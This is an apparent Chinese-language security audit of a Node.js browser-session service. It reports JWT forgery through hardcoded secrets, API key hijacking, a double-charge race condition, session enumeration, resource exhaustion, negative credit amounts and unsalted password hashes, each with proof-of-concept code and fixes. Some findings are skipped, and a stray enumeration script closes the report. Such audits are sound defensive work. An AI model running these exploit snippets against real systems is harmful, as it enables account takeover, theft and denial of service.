# playwright-user-sys 安全漏洞调研报告

**调研时间**: 2025-12-28
**调研对象**: playwright-user-sys 浏览器管理系统
**代码版本**: main branch
**调研方法**: 黑盒 + 白盒代码审计

---

## 执行摘要

本次调研发现 **21 个安全漏洞**，其中：
- **严重 (Critical)**: 3 个
- **高危 (High)**: 8 个
- **中危 (Medium)**: 7 个
- **低危 (Low)**: 3 个

主要问题集中在：
1. 认证与授权缺陷（JWT、API Key）
2. 资源滥用漏洞（积分扣费、会话管理）
3. 并发竞态条件
4. 越权访问
5. 信息泄露

## 一、严重漏洞 (Critical)

### C-1: JWT 弱密钥导致 Token 伪造

**风险等级**: ⚠️ **CRITICAL**

**漏洞位置**:
- `/Users/xuyingzhou/Project/study-node-ts/playwright-user-sys/src/utils/auth.ts:19-23`
- `/Users/xuyingzhou/Project/study-node-ts/playwright-user-sys/src/config/env.ts:33`

**问题描述**:
测试环境和生产环境使用弱密钥签名 JWT Token。在 `auth.ts:20` 中，测试环境使用硬编码密钥 `'test-secret-key'`，生产环境使用默认密钥 `'default_jwt_secret_change_in_production'`。

**攻击路径**:
```
步骤1: 攻击者注册普通用户账号，获取 JWT Token
步骤2: 伪造 JWT Token 的 payload，将 role 改为 'admin'
步骤3: 使用测试密钥 'test-secret-key' 或默认密钥重新签名 Token
步骤4: 使用伪造的管理员 Token 访问管理员接口
```

**利用示例**:
```javascript
// 使用 jsonwebtoken 库伪造 Token
const jwt = require('jsonwebtoken');
const fakeToken = jwt.sign(
  { id: 1, username: 'admin', role: 'admin' },
  'test-secret-key',  // 测试环境密钥
  { expiresIn: '24h' }
);

// 使用伪造的 Token
fetch('/api/admin/users', {
  headers: { 'Authorization': `Bearer ${fakeToken}` }
});
```

**影响范围**:
- 完全接管管理员权限
- 访问所有用户数据
- 修改积分、删除用户、创建后门账号

**修复建议**:
1. 使用强随机密钥（至少 256 位）
2. 从环境变量读取密钥，禁止硬编码
3. 不同环境使用不同密钥
4. 定期轮换密钥

### C-2: API Key 复用导致会话劫持

**风险等级**: ⚠️ **CRITICAL**

**漏洞位置**:
- `/Users/xuyingzhou/Project/study-node-ts/playwright-user-sys/src/middlewares/auth.middleware.ts:47-72`
- `/Users/xuyingzhou/Project/study-node-ts/playwright-user-sys/src/controllers/session.controller.ts:405-443`

**问题描述**:
API Key 永久有效，没有过期时间、没有撤销机制、没有使用频率限制。攻击者一旦获取 API Key，可以永久访问用户账号。

**攻击路径**:
```
步骤1: 攻击者通过 XSS、日志泄露、中间人攻击等手段获取 API Key
步骤2: 使用 API Key 直接访问 WebSocket 会话，劫持浏览器实例
步骤3: 通过浏览器实例窃取敏感数据、执行恶意操作
```

**利用示例**:
```bash
# 使用窃取的 API Key 创建会话
curl -X POST 'http://target/api/sessions' \
  -H 'x-api-key: stolen-uuid-api-key' \
  -H 'Content-Type: application/json' \
  -d '{"viewport": {"width": 1920, "height": 1080}}'

# 获取 WebSocket 端点后，直接连接并控制浏览器
ws://target:8082?sessionId=stolen-session-id
```

**影响范围**:
- 永久性账号接管
- 浏览器实例劫持
- 数据窃取

**修复建议**:
1. API Key 实现过期机制
2. 支持手动撤销 API Key
3. 记录 API Key 使用日志，检测异常使用
4. 使用短期 Token 替代永久 API Key

---

### C-3: 积分扣费双重支付漏洞

**风险等级**: ⚠️ **CRITICAL**

**漏洞位置**:
- `/Users/xuyingzhou/Project/study-node-ts/playwright-user-sys/src/models/session.model.ts:198-295`
- `/Users/xuyingzhou/Project/study-node-ts/playwright-user-sys/src/services/session.service.ts:137-207`

**问题描述**:
`markDisconnected()` 方法存在并发问题，同时调用会重复扣费。虽然有 `whereNotIn('status', [...])` 的数据库条件更新，但在第 269 行又调用了 `UserModel.deductCredits()`，导致在特定并发场景下重复扣费。

**攻击路径**:
```
步骤1: 攻击者创建会话
步骤2: 攻击者同时发送多个释放会话请求
步骤3: 如果请求在数据库更新前到达，会导致多次调用 deductCredits
步骤4: 用户积分被重复扣除
```

**利用示例**:
```javascript
// 并发发送释放请求
const sessionId = 'victim-session-id';
await Promise.all([
  fetch(`/api/sessions/${sessionId}/release`, { method: 'DELETE' }),
  fetch(`/api/sessions/${sessionId}/release`, { method: 'DELETE' }),
  fetch(`/api/sessions/${sessionId}/release`, { method: 'DELETE' }),
]);
```

**影响范围**:
- 用户积分被恶意消耗
- 经济损失

**修复建议**:
1. 使用数据库事务确保原子性
2. 在扣费前添加幂等性检查
3. 使用乐观锁或悲观锁防止并发
4. 记录扣费日志，便于追溯

## 二、高危漏洞 (High)

### H-1: 越权访问其他用户会话

**风险等级**: 🔴 **HIGH**

**漏洞位置**:
- `/Users/xuyingzhou/Project/study-node-ts/playwright-user-sys/src/controllers/session.controller.ts:93-135`

**问题描述**:
`getSession()` 方法只检查了 `session.user_id !== userId`，但可以通过遍历 session ID 猜测其他用户的会话。

**攻击路径**:
```
步骤1: 攻击者登录获取 Token
步骤2: 遍历 UUID 格式的 session ID
步骤3: 对每个 ID 调用 /api/sessions/:id
步骤4: 如果返回 200，说明找到了有效会话
```

**利用示例**:
```javascript
// 遍历常见 UUID
for (let i = 0; i < 10000; i++) {
  const sessionId = generateUUID(i);  // 构造可能的 UUID
  const res = await fetch(`/api/sessions/${sessionId}`, {
    headers: { 'Authorization': `Bearer ${token}` }
  });
  if (res.ok) {
    console.log(`Found session: ${sessionId}`);
  }
}
```

**影响范围**:
- 泄露其他用户的会话信息
- 获取 WebSocket 端点
- 隐私泄露

**修复建议**:
1. 严格检查会话所有权
2. 使用不可预测的 session ID
3. 限制查询频率
4. 记录异常访问日志

### H-2: 无限制的并发会话创建

**风险等级**: 🔴 **HIGH**

**漏洞位置**:
- `/Users/xuyingzhou/Project/study-node-ts/playwright-user-sys/src/services/session.service.ts:16-132`
- `/Users/xuyingzhou/Project/study-node-ts/playwright-user-sys/src/models/user.model.ts:131-144`

**问题描述**:
系统没有限制用户的并发会话数量，攻击者可以创建大量会话耗尽系统资源。

**攻击路径**:
```
步骤1: 攻击者注册账号并充值
步骤2: 并发创建大量会话
步骤3: 不释放会话，占满所有机器实例
步骤4: 其他用户无法创建会话，拒绝服务
```

**利用示例**:
```javascript
// 创建 1000 个并发会话
const promises = [];
for (let i = 0; i < 1000; i++) {
  promises.push(
    fetch('/api/sessions', {
      method: 'POST',
      headers: { 'Authorization': `Bearer ${token}` },
      body: JSON.stringify({ viewport: { width: 1280, height: 800 } })
    })
  );
}
await Promise.all(promises);
```

**影响范围**:
- 资源耗尽攻击
- 拒绝服务

**修复建议**:
1. 限制每个用户的并发会话数
2. 限制每分钟的会话创建频率
3. 对异常行为进行封禁

### H-3: 积分负数绕过

**风险等级**: 🔴 **HIGH**

**漏洞位置**:
- `/Users/xuyingzhou/Project/study-node-ts/playwright-user-sys/src/routes/admin-api.routes.ts:405-408`
- `/Users/xuyingzhou/Project/study-node-ts/playwright-user-sys/src/models/user.model.ts:125-128`

**问题描述**:
`addCredits()` 方法没有检查 amount 是否为负数，可以传递负数来扣除用户积分。

**攻击路径**:
```
步骤1: 攻击者获取管理员 Token（通过 C-1 漏洞）
步骤2: 调用添加积分接口，传递负数金额
步骤3: 目标用户积分被扣除
```

**利用示例**:
```bash
# 使用管理员 Token，添加负积分
curl -X POST 'http://target/api/admin/users/2/credits' \
  -H 'Authorization: Bearer admin_token' \
  -H 'Content-Type: application/json' \
  -d '{"amount": -999999}'
```

**影响范围**:
- 恶意扣除用户积分
- 经济损失

**修复建议**:
1. `addCredits()` 方法添加 amount > 0 的校验
2. 使用单独的 `deductCredits()` 方法处理扣费

### H-6: 密码哈希使用 SHA256

**风险等级**: 🔴 **HIGH**

**漏洞位置**:
- `/Users/xuyingzhou/Project/study-node-ts/playwright-user-sys/src/utils/auth.ts:6-15`

**问题描述**:
使用 SHA256 哈希密码，没有使用 salt，容易受到彩虹表攻击。

**攻击路径**:
```
步骤1: 攻击者获取数据库访问权限（如 SQL 注入）
步骤2: 导出用户密码哈希
步骤3: 使用彩虹表破解密码
步骤4: 使用破解的密码登录其他系统（密码复用）
```

**利用示例**:
```bash
# 使用 hashcat 或 john the ripper 破解 SHA256
hashcat -m 1400 hashes.txt wordlist.txt
```

**影响范围**:
- 密码泄露
- 账号接管

**修复建议**:
1. 使用 bcrypt、scrypt 或 argon2
2. 为每个密码生成随机 salt
3. 增加哈希迭代次数

---

### H-7: 操作日志异步记录可丢失

**风险等级**: 🔴 **HIGH**

**漏洞位置**:
- `/Users/xuyingzhou/Project/study-node-ts/playwright-user-sys/src/routes/admin-api.routes.ts:423-436`

**问题描述**:
操作日志使用 `.catch()` 异步记录，如果日志记录失败，错误被吞掉，审计追踪可能不完整。

**攻击路径**:
```
步骤1: 攻击者执行恶意操作
步骤2: 攻击者触发数据库故障或网络中断
步骤3: 日志记录失败，但操作成功
步骤4: 审计追踪缺失
```

**影响范围**:
- 审计追踪不完整
- 无法追溯恶意操作

**修复建议**:
1. 日志记录失败时回滚操作
2. 使用消息队列保证日志持久化
3. 定期检查日志完整性

---

### H-8: WebSocket 端点无认证

**风险等级**: 🔴 **HIGH**

**漏洞位置**:
- `/Users/xuyingzhou/Project/study-node-ts/playwright-user-sys/src/services/session.service.ts:94-107`

**影响范围**:
- 浏览器劫持
- 数据窃取

**修复建议**:
1. WebSocket 连接时验证 Token
2. 使用短期 Ticket 替代 session ID
3. 记录 WebSocket 连接日志

```python
import requests
import uuid

token = 'your-jwt-token'
headers = {'Authorization': f'Bearer {token}'}

for _ in range(10000):
    session_id = str(uuid.uuid4())
    r = requests.get(f'http://target/api/sessions/{session_id}', headers=headers)
    if r.status_code == 200:
        print(f'Found: {session_id}')
        print(r.json())
```
